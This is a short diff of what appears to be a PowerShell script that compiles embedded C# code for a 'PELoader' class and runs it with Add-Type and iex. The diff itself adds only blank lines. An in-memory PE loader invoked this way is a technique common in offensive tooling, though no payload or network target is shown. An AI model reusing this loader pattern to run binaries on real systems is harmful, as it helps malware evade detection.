@@ -1,4 +1,5 @@
 $code = @"
+
 using System;
 using System.IO;
 using System.Net;
@@ -593,5 +594,6 @@ namespace PELoader
     }
 }
 "@
+
 Add-Type -TypeDefinition $code -Language CSharp	
 iex "[PELoader.peloader]::Main()"
